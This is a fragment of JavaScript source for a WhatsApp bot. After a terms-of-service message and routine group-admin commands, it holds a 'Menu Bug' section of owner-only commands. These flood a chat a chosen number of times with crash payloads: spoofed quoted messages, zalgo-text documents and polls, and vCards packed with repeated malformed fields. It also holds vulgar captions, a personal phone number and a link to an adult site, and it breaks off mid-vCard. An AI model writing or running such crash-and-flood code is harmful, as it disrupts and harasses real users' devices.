m.reply(`➠ The minimum age limit for users (users) is 15 - 35 years, more or less than that will be immediately banned when verifying.

➠ User, group, and chat data will be deleted automatically if no activity is detected for 7 days (reason: database cleaning).

➠ Free users eat 20% of the total data (Quota / Limit), while premium users only 1.

➠ Do not spam, give pause for each use of the command for 3 seconds.

➠ It is forbidden to make voice or video calls (Telephone & Video Calls), if they do, they will be blocked.

➠ It is forbidden to be toxic to Nabot because it will get sanctions in the form of being banned and blocked.

➠ It is forbidden to search & create adult content (+18), for example making stickers from nude photos or searching for ASMR sighs

➠ If you want to unblock and get banned, each will be charged a fee of 5K.

➠ Spammers will be permanently banned for free and premium users (+ no refund).

➠ All Terms & Conditions are subject to change at any time without prior notice.`)
break
//============================================= Menu Bug By Fardan Faraxx & Vannes =======================\\
	case 'hidetagp': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            hisoka.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await hisoka.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await hisoka.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'bugvn':{
if (!isCreator) return
if (args.length == 0) return freply(`amount?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('./faraxx/chan.mp3')
 hisoka.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
 }
 }
break
	case 'bugdoc':{
if (!isCreator) return
if (args.length == 0) return freply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ ˣ_ˣ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'vanfax': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} My Name F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ ˣ_ˣ${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
  case 'four':{
if (!isCreator) return
if (args.length == 0) return m.reply(`amount?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let pek = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `kontol`, 
"jpegThumbnail": thumb
} 
} 
}
hisoka.sendText(m.chat, `🇹 🇭 🇪 🇫 🇴 🇺 🇷`, text, {quoted: pek})
}
}
break
 case 'crashcok':{
if (!isCreator) return
if (args.length == 0) return m.reply(`amount?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = '``🔥 *Fax Faraxx Modeer* 🔥``',
hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${faxbot}`,body: '🔥 *Fax Faraxx Moddrs* 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'bugpoll': {
if (!isCreator) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "Crash Fardan",
"options": [
	{
"optionName": "F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ "
	},
	{
"optionName": "F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ "
	},
	{
"optionName": "F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ "
	},
	{
"optionName": "F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ "
	},
	{
"optionName": "F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ "
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
hisoka.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
freply('sukses sendbug')
}
break
case 'faxxbugx': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Fax`
for (let i = 0; i < jumlah; i++) {
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Fax Faraxx Modder ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
hisoka.sendContact(m.chat, global.owner, fkontaak)
}
}
break
case 'jadibug2': {
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await hisoka.downloadAndSaveMediaMessage(quoted)
hisoka.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await hisoka.downloadAndSaveMediaMessage(quoted)
hisoka.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
case 'jadibug': {
if (!isCreator) return freply(`Khusus Owner`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await hisoka.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
hisoka.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
case 'faraxxbug': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Fax Faraxx Modderˣ_ˣ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 